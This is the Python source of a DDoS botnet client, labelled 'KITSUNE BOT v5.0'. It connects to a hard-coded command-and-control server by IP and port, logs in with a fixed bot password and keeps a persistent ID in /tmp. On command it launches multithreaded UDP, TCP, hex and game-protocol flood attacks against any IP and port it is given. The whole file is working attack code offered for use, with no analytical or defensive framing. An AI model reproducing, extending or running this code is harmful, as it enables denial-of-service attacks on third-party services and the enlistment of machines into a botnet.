#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess, random, os, time, threading, socket, uuid, struct, sys, codecs, re

# ─── CONFIGURACIÓN DE ENCODING ──────────────────────────────────────────────────
if sys.stdout.encoding != 'UTF-8':
    sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
    sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')

# ─── CONFIGURACIÓN ─────────────────────────────────────────────────────────────
C2_ADDRESS = "137.74.136.147"
C2_PORT = 55064

# ─── FUNCIONES SEGURAS ──────────────────────────────────────────────────────────
def safe_recv(sock, size=1024, timeout=10):
    try:
        sock.settimeout(timeout)
        data = sock.recv(size)
        if not data:
            return ""
        return data.decode('utf-8', errors='ignore')
    except socket.timeout:
        return ""
    except Exception:
        return ""

def safe_send(sock, data):
    try:
        if isinstance(data, str):
            sock.send(data.encode('utf-8', errors='ignore'))
        else:
            sock.send(data)
        return True
    except Exception:
        return False

# ─── UTILIDADES ──────────────────────────────────────────────────────────────
def get_architecture():
    try:
        result = subprocess.check_output(['uname', '-m'], stderr=subprocess.DEVNULL)
        arch = result.decode().strip()
        # Limpiar caracteres extraños
        arch = re.sub(r'[^a-zA-Z0-9_\-]', '', arch)
        return arch if arch else 'unknown'
    except:
        return 'unknown'

def get_bot_id():
    try:
        with open('/tmp/bot_id.txt', 'r') as f:
            return f.read().strip()
    except:
        bot_id = str(uuid.uuid4())[:8]
        try:
            with open('/tmp/bot_id.txt', 'w') as f:
                f.write(bot_id)
        except:
            pass
        return bot_id

# ─── VARIABLES GLOBALES ──────────────────────────────────────────────────────
user_attacks = {}  # username -> list of (stop_event, thread_count, method, ip, port, duration)
active_attacks = {}  # attack_id -> stop_event

# ─── MÉTODOS DE ATAQUE ──────────────────────────────────────────────────────
PACKET_SIZES = [1024, 2048, 4096, 8192]
payload_hex = b'\x55\x55\x55\x55\x00\x00\x00\x01'
payload_mcpe = b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73'

def attack_udp(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < secs and not stop_event.is_set():
            packet = random._urandom(random.choice(PACKET_SIZES))
            sock.sendto(packet, (ip, port))
    except:
        pass

def attack_tcp(ip, port, secs, stop_event):
    while time.time() < secs and not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            while time.time() < secs and not stop_event.is_set():
                sock.send(random._urandom(1024))
            sock.close()
        except:
            pass

def attack_hex(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < secs and not stop_event.is_set():
            sock.sendto(payload_hex, (ip, port))
    except:
        pass

def attack_mcpe(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < secs and not stop_event.is_set():
            sock.sendto(payload_mcpe, (ip, port))
    except:
        pass

def lunch_attack(method, ip, port, secs, stop_event):
    methods = {
        '.UDP': attack_udp,
        '.TCP': attack_tcp,
        '.HEX': attack_hex,
        '.MCPE': attack_mcpe,
        '.UDPBYPASS': attack_udp,
        '.TCPOVH': attack_tcp,
        '.HTTPGET': attack_tcp,
        '.HTTPPOST': attack_tcp,
        '.BROWSER': attack_tcp,
        '.UDPFRAG': attack_udp,
        '.UDPGAME': attack_udp,
        '.UDPPPS': attack_udp,
        '.UDPQUERY': attack_udp,
        '.UDPBYPASSV2': attack_udp,
        '.OVHUDP': attack_udp,
        '.OVHTCP': attack_tcp,
        '.MIX': attack_tcp,
        '.SYN': attack_tcp,
        '.MCBOT': attack_mcpe,
        '.FIVEM': attack_mcpe,
        '.VSE': attack_mcpe,
        '.RAKNET': attack_mcpe,
        '.STDHEX': attack_hex,
    }
    if method in methods:
        methods[method](ip, port, secs, stop_event)

def start_attack(method, ip, port, duration, thread_count, username):
    stop_event = threading.Event()
    end_time = time.time() + duration
    attack_id = f"{username}_{int(time.time())}"
    
    active_attacks[attack_id] = stop_event
    
    for _ in range(thread_count):
        threading.Thread(target=lunch_attack, args=(method, ip, port, end_time, stop_event), daemon=True).start()

    if username not in user_attacks:
        user_attacks[username] = []
    user_attacks[username].append((attack_id, stop_event, thread_count, method, ip, port, duration))
    
    # Auto-remover después de la duración
    threading.Thread(target=lambda: remove_attack_after(attack_id, duration), daemon=True).start()
    
    return attack_id

def remove_attack_after(attack_id, duration):
    time.sleep(duration)
    if attack_id in active_attacks:
        stop_event = active_attacks[attack_id]
        stop_event.set()
        del active_attacks[attack_id]

def stop_attacks(username):
    if username in user_attacks:
        for attack_id, stop_event, _, _, _, _, _ in user_attacks[username]:
            stop_event.set()
            if attack_id in active_attacks:
                del active_attacks[attack_id]
        user_attacks[username].clear()
        print(f"[+] Attacks stopped for {username}")

# ─── MAIN ────────────────────────────────────────────────────────────────────

def main():
    backoff = 1
    max_backoff = 60
    bot_id = get_bot_id()
    arch = get_architecture()
    
    while True:
        c2 = None
        try:
            c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            
            print(f"[*] Connecting to {C2_ADDRESS}:{C2_PORT}")
            print(f"[*] Arch: {arch} | ID: {bot_id}")
            c2.connect((C2_ADDRESS, C2_PORT))
            print("[+] Connected!")

            auth_step = 0
            buffer = ""
            
            while auth_step < 2:
                data = safe_recv(c2, 1024, 5)
                if not data:
                    time.sleep(0.5)
                    continue
                
                buffer += data
                
                if 'Username' in buffer or '❯' in buffer:
                    if auth_step == 0:
                        safe_send(c2, f"{arch}|{bot_id}\n")
                        print(f"[*] Sent: {arch}|{bot_id}")
                        auth_step = 1
                        buffer = ""
                
                if 'Password' in buffer:
                    if auth_step == 1:
                        safe_send(c2, 'BOT_PASSWORD\n')
                        print("[*] Sent bot password (BOT_PASSWORD)")
                        auth_step = 2
                        buffer = ""
            
            if auth_step < 2:
                raise Exception("Auth failed")
            
            print('✅ Authenticated as BOT!')
            backoff = 1
            
            last_heartbeat = time.time()
            while True:
                data = safe_recv(c2, 1024, 60)
                
                if not data:
                    if time.time() - last_heartbeat > 30:
                        safe_send(c2, '\n')
                        last_heartbeat = time.time()
                    continue
                
                print(f"📨 Command: {data[:50]}...")
                last_heartbeat = time.time()
                args = data.strip().split(' ')
                command = args[0].upper()

                if command == 'PING':
                    safe_send(c2, 'PONG\n')
                elif command == 'STOP':
                    if len(args) > 1:
                        stop_attacks(args[1])
                    else:
                        stop_attacks("default")
                elif command.startswith('.'):
                    try:
                        method = command
                        ip = args[1]
                        port = int(args[2])
                        secs = int(args[3])
                        threads_atk = int(args[4]) if len(args) >= 5 else 1
                        username_atk = args[5] if len(args) >= 6 else "default"
                        # Limitar concurrentes a 5
                        if threads_atk > 5:
                            threads_atk = 5
                            print(f"[*] Limitando concurrentes a 5")
                        print(f"[*] Attacking {ip}:{port} with {method} ({threads_atk} concurrentes)")
                        start_attack(method, ip, port, secs, threads_atk, username_atk)
                    except Exception as e:
                        print(f"Error: {e}")
                            
        except Exception as e:
            print(f"❌ Error: {e}")
            
        finally:
            try:
                if c2:
                    c2.close()
            except:
                pass
        
        wait = backoff + random.uniform(-0.5, 1)
        print(f"[*] Reconnecting in {wait:.1f}s")
        time.sleep(wait if wait > 0 else 1)
        backoff = min(backoff * 2, max_backoff)

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════╗
    ║         KITSUNE BOT - v5.0            ║
    ║         DDoS Bot Client               ║
    ╚═══════════════════════════════════════╝
    """)
    while True:
        try:
            main()
        except KeyboardInterrupt:
            print("\n🛑 Bot stopped")
            break
        except Exception as e:
            print(f"Fatal error: {e}")
            time.sleep(5)
